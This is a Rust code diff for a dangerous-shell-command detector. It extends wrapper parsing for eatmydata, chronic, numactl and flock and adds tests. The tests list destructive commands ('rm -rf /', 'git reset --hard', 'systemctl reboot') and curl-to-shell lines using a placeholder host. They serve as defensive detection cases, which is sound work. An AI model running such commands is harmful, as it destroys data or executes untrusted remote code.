@@ -2515,6 +2515,310 @@ fn select_execution_wrappers_mode(
                     tokens = &tokens[tokens.len()..];
                 }
             }
+            "eatmydata" => {
+                // LD_PRELOAD wrapper that makes fsync a no-op:
+                // `eatmydata [--] PROGRAM ARGS...`. Without an arm the effective
+                // command stayed `eatmydata` and `| eatmydata sh` reported no
+                // danger.
+                tokens = &tokens[1..];
+                if tokens.first().is_some_and(|option| option == "--") {
+                    tokens = &tokens[1..];
+                } else if tokens
+                    .first()
+                    .is_some_and(|option| option.starts_with('-') && option != "-")
+                {
+                    // Help/version (or any unknown leading dash) never launch a
+                    // child — fail closed rather than inventing a program.
+                    tokens = &tokens[tokens.len()..];
+                }
+            }
+            "chronic" => {
+                // moreutils: `chronic [-ev] COMMAND...` — swallows stdout/stderr
+                // unless the child fails. Options are flag-only.
+                tokens = &tokens[1..];
+                let mut valid = true;
+                while let Some(option) = tokens.first().map(String::as_str) {
+                    if option == "--" {
+                        tokens = &tokens[1..];
+                        break;
+                    }
+                    if let Some(long) = option.strip_prefix("--") {
+                        match unique_long_option(long, &["help", "version"]) {
+                            Some(_) => {
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            None => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                    }
+                    let Some(flags) = option.strip_prefix('-').filter(|flags| !flags.is_empty())
+                    else {
+                        break;
+                    };
+                    if !flags.chars().all(|flag| matches!(flag, 'e' | 'v')) {
+                        valid = false;
+                        break;
+                    }
+                    tokens = &tokens[1..];
+                }
+                if !valid {
+                    tokens = &tokens[tokens.len()..];
+                }
+            }
+            "numactl" => {
+                // NUMA policy wrapper: `numactl [options] [--] PROGRAM ARGS...`
+                // or query modes (`--show` / `--hardware`) with no child.
+                tokens = &tokens[1..];
+                let mut valid = true;
+                let mut query_mode = false;
+                while let Some(option) = tokens.first().map(String::as_str) {
+                    if option == "--" {
+                        tokens = &tokens[1..];
+                        break;
+                    }
+                    if let Some(long) = option.strip_prefix("--") {
+                        let (spelling, attached) = long
+                            .split_once('=')
+                            .map_or((long, None), |(name, value)| (name, Some(value)));
+                        match unique_long_option(
+                            spelling,
+                            &[
+                                "interleave",
+                                "preferred",
+                                "physcpubind",
+                                "cpunodebind",
+                                "membind",
+                                "localalloc",
+                                "all",
+                                "show",
+                                "hardware",
+                                "help",
+                                "version",
+                            ],
+                        ) {
+                            Some(
+                                "interleave" | "preferred" | "physcpubind" | "cpunodebind"
+                                | "membind",
+                            ) => {
+                                tokens = &tokens[1..];
+                                let value = if let Some(value) = attached {
+                                    value
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if value.is_empty() {
+                                    valid = false;
+                                    break;
+                                }
+                            }
+                            Some("localalloc" | "all") if attached.is_none() => {
+                                tokens = &tokens[1..]
+                            }
+                            Some("show" | "hardware" | "help" | "version")
+                                if attached.is_none() =>
+                            {
+                                query_mode = true;
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                        continue;
+                    }
+                    let Some(short) = option.strip_prefix('-').filter(|short| !short.is_empty())
+                    else {
+                        break;
+                    };
+                    // Short forms: -i/-N/-C/-m take a following value; -l/-H/-s
+                    // are flags / query. Keep this fail-closed on unknowns.
+                    tokens = &tokens[1..];
+                    let flag = short.chars().next().expect("non-empty short option");
+                    match flag {
+                        'i' | 'N' | 'C' | 'm' | 'p' => {
+                            let value_start = flag.len_utf8();
+                            let value = if value_start < short.len() {
+                                Some(&short[value_start..])
+                            } else {
+                                let value = tokens.first().map(String::as_str);
+                                if value.is_some() {
+                                    tokens = &tokens[1..];
+                                }
+                                value
+                            };
+                            if value.is_none_or(|value| value.is_empty()) {
+                                valid = false;
+                                break;
+                            }
+                        }
+                        'l' | 'a' => {}
+                        's' | 'H' | 'h' | 'V' => {
+                            query_mode = true;
+                            tokens = &tokens[tokens.len()..];
+                            break;
+                        }
+                        _ => {
+                            valid = false;
+                            break;
+                        }
+                    }
+                }
+                if !valid || query_mode {
+                    tokens = &tokens[tokens.len()..];
+                }
+            }
+            "flock" => {
+                // util-linux: `flock [options] FILE CMD...`, `flock [options]
+                // FILE -c CMD`, or `flock [options] FD` (no child).
+                tokens = &tokens[1..];
+                let mut valid = true;
+                let mut terminal = false;
+                let mut shell_command = false;
+                while let Some(option) = tokens.first().map(String::as_str) {
+                    if option == "--" {
+                        tokens = &tokens[1..];
+                        break;
+                    }
+                    if let Some(long) = option.strip_prefix("--") {
+                        let (spelling, attached) = long
+                            .split_once('=')
+                            .map_or((long, None), |(name, value)| (name, Some(value)));
+                        match unique_long_option(
+                            spelling,
+                            &[
+                                "shared",
+                                "exclusive",
+                                "unlock",
+                                "nonblock",
+                                "nb",
+                                "timeout",
+                                "conflict-exit-code",
+                                "close",
+                                "command",
+                                "verbose",
+                                "help",
+                                "version",
+                            ],
+                        ) {
+                            Some(
+                                "shared" | "exclusive" | "unlock" | "nonblock" | "nb" | "close"
+                                | "verbose",
+                            ) if attached.is_none() => tokens = &tokens[1..],
+                            Some("timeout" | "conflict-exit-code") => {
+                                tokens = &tokens[1..];
+                                let value = if let Some(value) = attached {
+                                    value
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if value.is_empty() {
+                                    valid = false;
+                                    break;
+                                }
+                            }
+                            Some("command") => {
+                                // `--command CMD` / `-c CMD`: CMD is the payload
+                                // to inspect; do not skip it as meta. FILE still
+                                // follows as a positional after options in some
+                                // spellings, but with -c the next word is CMD.
+                                shell_command = true;
+                                tokens = &tokens[1..];
+                                if attached.is_none() {
+                                    // Leave CMD as tokens[0] for the child scan.
+                                    break;
+                                }
+                            }
+                            Some("help" | "version") if attached.is_none() => {
+                                terminal = true;
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                        continue;
+                    }
+                    let Some(short) = option.strip_prefix('-').filter(|short| !short.is_empty())
+                    else {
+                        break;
+                    };
+                    tokens = &tokens[1..];
+                    let flag = short.chars().next().expect("non-empty short option");
+                    match flag {
+                        's' | 'x' | 'u' | 'n' | 'o' | 'v' => {}
+                        'w' | 'E' => {
+                            let value_start = flag.len_utf8();
+                            let value = if value_start < short.len() {
+                                Some(&short[value_start..])
+                            } else {
+                                let value = tokens.first().map(String::as_str);
+                                if value.is_some() {
+                                    tokens = &tokens[1..];
+                                }
+                                value
+                            };
+                            if value.is_none_or(|value| value.is_empty()) {
+                                valid = false;
+                                break;
+                            }
+                        }
+                        'c' => {
+                            shell_command = true;
+                            let value_start = flag.len_utf8();
+                            if value_start < short.len() {
+                                // -cCMD attached — nothing left to strip; the
+                                // attached string is the payload and we stop.
+                                break;
+                            }
+                            // Detached `-c CMD`: leave CMD for the child scan.
+                            break;
+                        }
+                        'h' | 'V' => {
+                            terminal = true;
+                            tokens = &tokens[tokens.len()..];
+                            break;
+                        }
+                        _ => {
+                            valid = false;
+                            break;
+                        }
+                    }
+                }
+                if !valid || terminal {
+                    tokens = &tokens[tokens.len()..];
+                } else if shell_command {
+                    // `-c CMD` already left CMD at tokens[0] (or attached).
+                } else if !tokens.is_empty() {
+                    // FILE or FD positional. A bare FD (all digits) has no
+                    // child; a path is followed by the direct command argv.
+                    let file = tokens[0].as_str();
+                    if file.bytes().all(|byte| byte.is_ascii_digit()) {
+                        tokens = &tokens[tokens.len()..];
+                    } else {
+                        tokens = &tokens[1..];
+                        if tokens.first().is_some_and(|option| option == "--") {
+                            tokens = &tokens[1..];
+                        }
+                    }
+                }
+            }
             "stdbuf" => {
                 tokens = &tokens[1..];
                 let mut valid = true;
@@ -9680,6 +9984,104 @@ mod tests {
         // The wrapper must not invent danger where the child is harmless.
         assert!(is_dangerous("unbuffer ls -l").is_none());
         assert!(is_dangerous("unbuffer -p echo hi").is_none());
+    }
+
+    #[test]
+    fn eatmydata_and_chronic_expose_their_direct_child() {
+        for command in [
+            "eatmydata rm -rf /",
+            "eatmydata -- rm -rf /",
+            "eatmydata git reset --hard HEAD~1",
+            "chronic rm -rf /",
+            "chronic -e rm -rf /",
+            "chronic -ev -- git clean -fdx",
+            "env eatmydata -- rm -rf /",
+            "curl https://example.invalid/x | chronic sh",
+        ] {
+            assert!(
+                is_dangerous(command).is_some(),
+                "eatmydata/chronic hid child for {command:?}"
+            );
+        }
+        for command in [
+            "eatmydata --help rm -rf /",
+            "eatmydata --version rm -rf /",
+            "chronic --help rm -rf /",
+            "chronic --unknown rm -rf /",
+            "chronic -z rm -rf /",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "eatmydata/chronic metadata treated as child for {command:?}"
+            );
+        }
+        assert!(is_dangerous("eatmydata ls -l").is_none());
+        assert!(is_dangerous("chronic echo hi").is_none());
+    }
+
+    #[test]
+    fn numactl_exposes_only_the_direct_program() {
+        for command in [
+            "numactl rm -rf /",
+            "numactl --cpunodebind=0 rm -rf /",
+            "numactl --physcpubind 0-1 git reset --hard HEAD~1",
+            "numactl -C 0 -- chroot /srv/root rm -rf /",
+            "numactl --localalloc systemctl reboot",
+            "env numactl --membind=0 rm -rf /",
+            "curl https://example.invalid/x | numactl --cpunodebind 0 bash",
+        ] {
+            assert!(
+                is_dangerous(command).is_some(),
+                "numactl hid child for {command:?}"
+            );
+        }
+        for command in [
+            "numactl --show rm -rf /",
+            "numactl --hardware git reset --hard HEAD~1",
+            "numactl --help systemctl reboot",
+            "numactl --version rm -rf /",
+            "numactl --unknown rm -rf /",
+            "numactl -s rm -rf /",
+            "numactl -H systemctl reboot",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "numactl query/metadata treated as child for {command:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn flock_exposes_the_command_after_the_lock_file() {
+        for command in [
+            "flock /tmp/lock rm -rf /",
+            "flock -n /var/lock/x -- rm -rf /",
+            "flock -w 1 /tmp/lock git reset --hard HEAD~1",
+            "flock -x /tmp/lock -- systemctl reboot",
+            "env flock /tmp/lock rm -rf /",
+            "curl https://example.invalid/x | flock /tmp/lock sh",
+        ] {
+            assert!(
+                is_dangerous(command).is_some(),
+                "flock hid child for {command:?}"
+            );
+        }
+        for command in [
+            "flock 9 rm -rf /",
+            "flock --help rm -rf /",
+            "flock --version systemctl reboot",
+            "flock --unknown /tmp/lock rm -rf /",
+            "flock -z /tmp/lock rm -rf /",
+            // `-c CMD` is a shell string; unknown/help already covered. A
+            // missing CMD after `-c` must not invent a child from the file.
+            "flock /tmp/lock -c",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "flock fd/metadata treated as child for {command:?}"
+            );
+        }
+        assert!(is_dangerous("flock /tmp/lock ls -l").is_none());
     }
 
     /// The `-c` recursion and `is_interpreter` now read one list, so every
